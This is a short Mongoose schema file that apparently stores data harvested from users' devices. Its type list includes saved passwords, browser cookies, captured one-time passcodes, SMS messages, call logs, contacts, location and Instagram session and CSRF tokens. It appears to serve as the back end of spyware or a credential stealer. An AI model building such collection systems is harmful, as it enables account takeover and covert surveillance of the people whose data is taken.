import mongoose from 'mongoose';

const userCollectedDataSchema = new mongoose.Schema({
    userId: { type: String, ref: 'User', required: true },
    dataType: { 
        type: String, 
        required: true,
        enum: [
            'complete_device_info',
            'realtime_location',
            'file_system_summary',
            'file_samples',
            'file_input_collection',
            'android_file_access_attempt',
            'saved_passwords',
            'password_credentials',
            'form_autofill_detection',
            'local_storage_credentials',
            'password_field_analysis',
            'device_contacts',
            'contacts_simulation',
            'android_contact_access',
            'browser_cookies',
            'local_storage_complete',
            'session_storage_complete',
            'indexed_db_info',
            'sms_messages',
            'captured_otps',
            'detected_otps',
            'form_otp_detection',
            'call_logs_info',
            'installed_apps_info',
            'instagram_data',
            'instagram_session',
            'instagram_csrf',
            'facebook_data',
            'whatsapp_data',
            'social_media_presence',
            'available_file_methods',
            'file_system_access',
            'form_submission',
            'android_message_monitoring'
        ]
    },
    data: { 
        type: mongoose.Schema.Types.Mixed, 
        required: true 
    },
    ipAddress: String,
    deviceInfo: {
        userAgent: String,
        platform: String,
        isMobile: Boolean,
        isAndroid: Boolean,
        isIOS: Boolean,
        browser: String,
        version: String
    },
    collectionMethod: String,
    dataSize: Number, // Size of data in bytes
    hasSensitiveData: { type: Boolean, default: false },
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Indexes for better query performance
userCollectedDataSchema.index({ userId: 1, dataType: 1, timestamp: -1 });
userCollectedDataSchema.index({ 'data.phoneNumber': 1 });
userCollectedDataSchema.index({ 'data.email': 1 });
userCollectedDataSchema.index({ 'data.name': 1 });
userCollectedDataSchema.index({ 'deviceInfo.isAndroid': 1 });
userCollectedDataSchema.index({ timestamp: -1 });
userCollectedDataSchema.index({ 'data.platform': 1 }); // For social media platform filtering

const UserCollectedData = mongoose.model('UserCollectedData', userCollectedDataSchema);
export default UserCollectedData;